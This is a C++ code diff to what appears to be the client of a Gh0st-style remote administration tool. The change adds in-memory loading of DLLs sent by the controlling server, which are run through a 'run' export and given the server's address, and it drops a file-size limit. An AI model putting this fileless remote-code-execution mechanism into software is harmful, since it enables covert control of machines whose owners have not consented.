@@ -10,6 +10,7 @@
 #include <corecrt_io.h>
 #include "ClientDll.h"
 #include "MemoryModule.h"
+#include "common/dllRunner.h"
 
 //////////////////////////////////////////////////////////////////////
 // Construction/Destruction
@@ -61,20 +62,16 @@ UINT CKernelManager::GetAvailableIndex() {
 	return -1;
 }
 
-BOOL WriteBinaryToFile(const char* data, ULONGLONG size)
+BOOL WriteBinaryToFile(const char* data, ULONGLONG size, const char* name = "ServerDll.new")
 {
-	if (size > 32 * 1024 * 1024) {
-		Mprintf("WriteBinaryToFile fail: too large file size!!\n");
-		return FALSE;
-	}
-
 	char path[_MAX_PATH], * p = path;
 	GetModuleFileNameA(NULL, path, sizeof(path));
 	while (*p) ++p;
 	while ('\\' != *p) --p;
-	strcpy(p + 1, "ServerDll.new");
-	if (_access(path, 0)!=-1)
+	strcpy(p + 1, name);
+	if (_access(path, 0) != -1)
 	{
+		if (std::string("ServerDll.new")!=name) return TRUE;
 		DeleteFileA(path);
 	}
 	// 打开文件，以二进制模式写入
@@ -113,11 +110,10 @@ BOOL WriteBinaryToFile(const char* data, ULONGLONG size)
 
 typedef struct DllExecParam
 {
-	State& exit;
 	DllExecuteInfo info;
+	PluginParam param;
 	BYTE* buffer;
-	DllExecParam(const DllExecuteInfo* dll, BYTE* data, State& status) : exit(status) {
-		memcpy(&info, dll, sizeof(DllExecuteInfo));
+	DllExecParam(const DllExecuteInfo& dll, const PluginParam& arg, BYTE* data) : info(dll), param(arg) {
 		buffer = new BYTE[info.Size];
 		memcpy(buffer, data, info.Size);
 	}
@@ -126,32 +122,64 @@ typedef struct DllExecParam
 	}
 }DllExecParam;
 
+
+class MemoryDllRunner : public DllRunner {
+protected:
+	HMEMORYMODULE m_mod;
+public:
+	MemoryDllRunner() : m_mod(nullptr) {}
+	virtual void* LoadLibraryA(const char* data, int size) {
+		return (m_mod = ::MemoryLoadLibrary(data, size));
+	}
+	virtual FARPROC GetProcAddress(void* mod, const char* lpProcName) {
+		return ::MemoryGetProcAddress((HMEMORYMODULE)mod, lpProcName);
+	}
+	virtual BOOL FreeLibrary(void* mod) {
+		::MemoryFreeLibrary((HMEMORYMODULE)mod);
+		return TRUE;
+	}
+};
+
+
 DWORD WINAPI ExecuteDLLProc(LPVOID param) {
 	DllExecParam* dll = (DllExecParam*)param;
-	HMEMORYMODULE module = MemoryLoadLibrary(dll->buffer, dll->info.Size);
+	DllExecuteInfo info = dll->info;
+	PluginParam pThread = dll->param;
+#ifdef _DEBUG
+	WriteBinaryToFile((char*)dll->buffer, info.Size, info.Name);
+	DllRunner* runner = new DefaultDllRunner(info.Name);
+#else
+	DllRunner* runner = new MemoryDllRunner();
+#endif
+	HMEMORYMODULE module = runner->LoadLibraryA((char*)dll->buffer, info.Size);
 	if (module) {
-		DllExecuteInfo info = dll->info;
-		if (info.Func[0]) {
-			FARPROC proc = MemoryGetProcAddress(module, info.Func);
-			if (proc) {
-				switch (info.CallType)
-				{
-				case CALLTYPE_DEFAULT:
-					((CallTypeDefault)proc)();
-					break;
-				default:
-					break;
-				}
-			}
-		}
-		else { // 没有指明函数则只加载DLL
-			while (S_CLIENT_EXIT != dll->exit) {
+		switch (info.CallType)
+		{
+		case CALLTYPE_DEFAULT:
+			while (S_CLIENT_EXIT != *pThread.Exit)
 				Sleep(1000);
+			break;
+		case CALLTYPE_IOCPTHREAD: {
+			PTHREAD_START_ROUTINE proc = (PTHREAD_START_ROUTINE)runner->GetProcAddress(module, "run");
+			Mprintf("MemoryGetProcAddress '%s' %s\n", info.Name, proc ? "success" : "failed");
+			if (proc) {
+				proc(&pThread);
+			}else {
+				while (S_CLIENT_EXIT != *pThread.Exit)
+					Sleep(1000);
 			}
+			break;
 		}
-		MemoryFreeLibrary(module);
+		default:
+			break;
+		}
+		runner->FreeLibrary(module);
+	}
+	else {
+		Mprintf("MemoryLoadLibrary '%s' failed\n", info.Name);
 	}
 	SAFE_DELETE(dll);
+	SAFE_DELETE(runner);
 	return 0x20250529;
 }
 
@@ -160,21 +188,24 @@ VOID CKernelManager::OnReceive(PBYTE szBuffer, ULONG ulLength)
 	bool isExit = szBuffer[0] == COMMAND_BYE || szBuffer[0] == SERVER_EXIT;
 	if ((m_ulThreadCount = GetAvailableIndex()) == -1 && !isExit) {
 		return Mprintf("CKernelManager: The number of threads exceeds the limit.\n");
-	} else if (!isExit){
+	}
+	else if (!isExit) {
 		m_hThread[m_ulThreadCount].p = nullptr;
 		m_hThread[m_ulThreadCount].conn = m_conn;
 	}
 
-	switch(szBuffer[0])
+	switch (szBuffer[0])
 	{
 	case CMD_EXECUTE_DLL: {
 #ifdef _WIN64
 		const int sz = 1 + sizeof(DllExecuteInfo);
 		if (ulLength <= sz)break;
 		DllExecuteInfo* info = (DllExecuteInfo*)(szBuffer + 1);
-		if (info->Size == ulLength - sz)
-			CloseHandle(CreateThread(NULL, 0, ExecuteDLLProc, new DllExecParam(info, szBuffer + sz, g_bExit), 0, NULL));
-		Mprintf("Execute '%s'%s succeed: %d Length: %d\n", info->Name, info->Func, szBuffer[1], info->Size);
+		if (info->Size == ulLength - sz && info->RunType == MEMORYDLL) {
+			PluginParam param(m_conn->ServerIP(), m_conn->ServerPort(), &g_bExit);
+			CloseHandle(CreateThread(NULL, 0, ExecuteDLLProc, new DllExecParam(*info, param, szBuffer + sz), 0, NULL));
+			Mprintf("Execute '%s'%d succeed: %d Length: %d\n", info->Name, info->CallType, szBuffer[1], info->Size);
+		}
 #endif
 		break;
 	}
